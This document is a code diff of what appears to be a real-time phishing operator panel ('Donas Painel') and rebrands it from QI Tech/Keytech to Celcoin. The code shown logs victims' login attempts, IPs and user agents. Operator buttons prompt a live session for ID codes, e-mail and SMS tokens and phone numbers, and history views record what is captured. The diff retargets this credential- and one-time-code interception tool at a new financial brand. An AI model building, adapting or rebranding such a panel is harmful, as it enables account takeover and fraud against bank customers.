@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>QI Tech · Donas Painel</title>
+<title>Celcoin · Donas Painel</title>
 <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@500;600&display=swap" rel="stylesheet">
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
@@ -595,7 +595,7 @@ body[data-theme="day"] .tent-info-bar .dev{color:#0F172A}
 body[data-theme="day"] .copyable.copied{background:#ECFDF5 !important;color:#047857 !important;border-color:#A7F3D0 !important}
 body[data-theme="day"] .copyable.copied::after{background:#fff;color:#047857;border-color:#A7F3D0;box-shadow:0 4px 12px rgba(15,23,42,.1)}
 
-/* ===== Origem (de qual produto QI Tech) ===== */
+/* ===== Origem (de qual produto Celcoin) ===== */
 .tent-origin{
   display:inline-flex;align-items:center;gap:6px;padding:4px 9px 4px 5px;border-radius:8px;
   font-size:11px;font-weight:700;letter-spacing:-.005em;border:1px solid;line-height:1.1;
@@ -614,7 +614,7 @@ body[data-theme="day"] .copyable.copied::after{background:#fff;color:#047857;bor
 /* Risk Solutions — vermelho */
 .tent-origin.risk{background:rgba(239,68,68,.08);border-color:rgba(239,68,68,.28);color:#FECACA}
 .tent-origin.risk .ico{background:linear-gradient(135deg,#EF4444,#B91C1C)}
-/* QI Sign — verde */
+/* Celcoin Sign — verde */
 .tent-origin.sign{background:rgba(34,197,94,.08);border-color:rgba(34,197,94,.28);color:#BBF7D0}
 .tent-origin.sign .ico{background:linear-gradient(135deg,#22C55E,#15803D)}
 /* Outro */
@@ -756,8 +756,8 @@ body[data-theme="day"] .cmd-slot .ui-row{border-bottom-color:rgba(15,23,42,.06)}
   <div class="login-form-side">
     <form class="login-card" id="loginForm" autocomplete="off">
       <div class="qi-logo">
-        <div class="qi-mark">K</div>
-        <div class="qi-text">Keytech<small>Donas painel</small></div>
+        <div class="qi-mark">C</div>
+        <div class="qi-text">Celcoin<small>Donas painel</small></div>
       </div>
 
       <h2>Acessar painel</h2>
@@ -807,8 +807,8 @@ body[data-theme="day"] .cmd-slot .ui-row{border-bottom-color:rgba(15,23,42,.06)}
 <div class="app" id="appRoot" style="display:none">
   <aside class="side">
     <div class="brand">
-      <div class="brand-mark qi"><span>K</span></div>
-      <div class="brand-name">Keytech<small>Donas painel</small></div>
+      <div class="brand-mark qi"><span>C</span></div>
+      <div class="brand-name">Celcoin<small>Donas painel</small></div>
     </div>
     <nav class="nav">
       <div class="nav-section">Geral</div>
@@ -1381,7 +1381,7 @@ $('#btnExport').onclick = ()=>{
   allRecent.forEach(it=>rows.push([it.path,it.ip,it.user_agent,it.language,it.timezone,it.timestamp]));
   const csv = rows.map(r=>r.map(v=>'"'+String(v||'').replace(/"/g,'""')+'"').join(',')).join('\n');
   const blob = new Blob([csv],{type:'text/csv'}); const url = URL.createObjectURL(blob);
-  const a = document.createElement('a'); a.href = url; a.download='acessos-qitech.csv'; a.click(); URL.revokeObjectURL(url);
+  const a = document.createElement('a'); a.href = url; a.download='acessos-celcoin.csv'; a.click(); URL.revokeObjectURL(url);
 };
 $('#btnClear').onclick = async ()=>{
   if (!confirm('Tem certeza? Isso apaga todo o histórico de acessos.')) return;
@@ -1453,7 +1453,7 @@ function originFromPage(path){
   if (/Administracao-e-Custodia$/.test(p)) return {cls:'admin', ico:'AC', name:'Administração', sub:'investidor'};
   if (/area-gestor$/.test(p)) return {cls:'admin', ico:'AG', name:'Administração', sub:'gestor'};
   if (/Risk-Solutions$/.test(p)) return {cls:'risk',  ico:'RS', name:'Risk Solutions', sub:'fraud & credit'};
-  if (/QI-Sign$/.test(p)) return {cls:'sign',  ico:'QS', name:'QI Sign',        sub:'assinatura'};
+  if (/QI-Sign$/.test(p)) return {cls:'sign',  ico:'QS', name:'Celcoin Sign',        sub:'assinatura'};
   return {cls:'other', ico:'?', name:(path||'—'), sub:''};
 }
 
@@ -1493,7 +1493,7 @@ function renderUserInfo(it){
 function renderCmdButtons(sessionId){
   const sid = (sessionId||'').replace(/"/g,'&quot;');
   return `<div class="cmd-row">
-    <button class="cmd-btn c1" title="ID QI Tech" data-cmd="qid" data-sid="${sid}"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg></button>
+    <button class="cmd-btn c1" title="ID Celcoin" data-cmd="qid" data-sid="${sid}"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg></button>
     <button class="cmd-btn c2" title="Dados inválidos" data-cmd="invalid" data-sid="${sid}"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="m10.29 3.86-8.18 14a2 2 0 0 0 1.71 3h16.36a2 2 0 0 0 1.71-3l-8.18-14a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg></button>
     <button class="cmd-btn c3" title="Token E-mail" data-cmd="email" data-sid="${sid}"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="5" width="18" height="14" rx="2"/><path d="m3 7 9 6 9-6"/></svg></button>
     <button class="cmd-btn c4" title="Token SMS" data-cmd="sms" data-sid="${sid}"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="7" y="2" width="10" height="20" rx="2"/><line x1="11" y1="18" x2="13" y2="18"/></svg></button>
@@ -1549,7 +1549,7 @@ async function refreshTentativas(){
           loginAt: it.timestamp || ''
         };
         const events = [];
-        if (cur.qid > (prev.qid||0)) events.push({label:'Token QI ID', tag:'qid'});
+        if (cur.qid > (prev.qid||0)) events.push({label:'Token Celcoin ID', tag:'qid'});
         if (cur.email > (prev.email||0)) events.push({label:'Token e-mail', tag:'email'});
         if (cur.sms > (prev.sms||0)) events.push({label:'Token SMS', tag:'sms'});
         if (cur.emailIn > (prev.emailIn||0)) events.push({label:'E-mail cadastrado', tag:'email'});
@@ -1703,7 +1703,7 @@ async function sendCmd(btn, cmd, sid, payload){
     const j = await r.json();
     if (j.ok){
       const labels = {
-        invalid:'Dados inválidos', qid:'ID QI Tech', qid_invalid:'Código inválido (QI ID)',
+        invalid:'Dados inválidos', qid:'ID Celcoin', qid_invalid:'Código inválido (Celcoin ID)',
         email:'Código por e-mail', email_invalid:'E-mail inválido',
         sms_phone:'Solicitação de celular', sms_code:'Código SMS', sms_invalid:'SMS inválido',
         chat:'Mensagem enviada', terminate:'Encerrar sessão'
@@ -1900,7 +1900,7 @@ async function openHistory(sid){
       chat_reply:'<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>',
       command:'<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 6h16M4 12h16M4 18h7"/></svg>'
     };
-    const labels = {screen:'Página', login_attempt:'Tentativa de login', qid_code:'Código QI Tech ID', email_code:'Código por e-mail', sms_phone:'Nº celular informado', sms_code:'Código SMS', chat_reply:'Resposta do usuário', command:'Comando enviado'};
+    const labels = {screen:'Página', login_attempt:'Tentativa de login', qid_code:'Código Celcoin ID', email_code:'Código por e-mail', sms_phone:'Nº celular informado', sms_code:'Código SMS', chat_reply:'Resposta do usuário', command:'Comando enviado'};
     drawer.querySelector('#hdBody').innerHTML = items.map(it=>{
       const ico = icons[it.type] || icons.screen;
       const lbl = labels[it.type] || it.type;
@@ -1920,7 +1920,7 @@ async function openHistory(sid){
       } else if (it.type === 'screen'){
         val = `<div class="hd-kv">${it.value}</div>`;
       } else if (it.type === 'command'){
-        const cmdLabel = {invalid:'Dados inválidos',qid:'Solicitou QI Tech ID',qid_invalid:'QI Tech ID inválido',email:'Solicitou código e-mail',email_invalid:'Código e-mail inválido',sms_phone:'Solicitou celular',sms_code:'Solicitou código SMS',sms_invalid:'SMS inválido',chat:'Mensagem ao usuário',terminate:'Encerrou sessão'};
+        const cmdLabel = {invalid:'Dados inválidos',qid:'Solicitou Celcoin ID',qid_invalid:'Celcoin ID inválido',email:'Solicitou código e-mail',email_invalid:'Código e-mail inválido',sms_phone:'Solicitou celular',sms_code:'Solicitou código SMS',sms_invalid:'SMS inválido',chat:'Mensagem ao usuário',terminate:'Encerrou sessão'};
         const extra = it.payload ? ` — <i>"${(it.payload||'').replace(/</g,'&lt;')}"</i>` : '';
         val = `<div class="hd-kv">${cmdLabel[it.value] || it.value}${extra}</div>`;
       } else {
